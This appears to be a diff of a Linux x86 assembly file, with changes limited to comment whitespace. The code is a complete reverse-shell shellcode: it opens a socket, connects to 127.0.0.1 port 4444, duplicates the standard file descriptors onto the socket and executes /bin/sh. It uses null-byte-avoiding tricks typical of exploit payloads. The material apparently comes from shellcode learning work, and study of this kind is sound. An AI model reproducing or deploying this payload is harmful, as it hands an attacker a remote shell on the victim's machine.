@@ -22,28 +22,28 @@ _start:
 	; for type SOCK_STREAM(0x1)
 	; for protocol IP (0x0)	
 
-	xor ebx, ebx 			; ebx = 0
+	xor ebx, ebx 				; ebx = 0
 	mul ebx					; eax=ebx=edx = 0
 	push ebx				; push 0 onto the stack
 	inc ebx					; ebx = 1
 	push ebx				; push 1 onto the stack
-	push byte 0x2			; push 2 onto the stack
-	mov ecx, esp			; set ecx to the address of our args
-	mov al, 0x66			; syscall socketcall
+	push byte 0x2				; push 2 onto the stack
+	mov ecx, esp				; set ecx to the address of our args
+	mov al, 0x66				; syscall socketcall
 	int 0x80				; make the syscall socketcall(socket(2,1,0))
 
-	xchg edx, eax			; we need to save the result of socket function for later usage
-
+	xchg edx, eax				; we need to save the result of socket function for later usage
+	
 	
 	; création de la connexion
 	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
 	; we save sockfd just before
 	; sockaddr structure
 
-	push 0x0101017f			; @Ip 127.0.0.1
-	push dword 0x5c11 		; Port 4444
+	push 0x0101017f				; @Ip 127.0.0.1
+	push dword 0x5c11 			; Port 4444
 	inc ebx
-    push word bx     		; Ajout de AF_INET et pour eviter d'avoir un null byte
+    push word bx     				; Ajout de AF_INET et pour eviter d'avoir un null byte
     mov ecx, esp	
 	push 0x10				; addrlen
 	push ecx				; struct *addr
@@ -61,7 +61,7 @@ _start:
 	xor ecx, ecx
 	mov cl, 0x2				; ecx = 2
 _:
-	mov al, 0x3f			; syscall dup2
+	mov al, 0x3f				; syscall dup2
 	int 0x80
 	dec ecx
 	jns _
@@ -73,8 +73,8 @@ _:
 	xor ecx,ecx				; ecx = 0
 	mul ecx					; eax = edx =ecx = 0
 	push eax				; push 0 onto the stack
-	push 0x68732f2f			; push //bin/sh
+	push 0x68732f2f				; push //bin/sh
 	push 0x6e69622f
-	mov ebx, esp			; save esp into ebx
+	mov ebx, esp				; save esp into ebx
 	mov al, 0xb		
 	int 0x80				; make the syscall execve("/bin/sh", NULL, NULL)
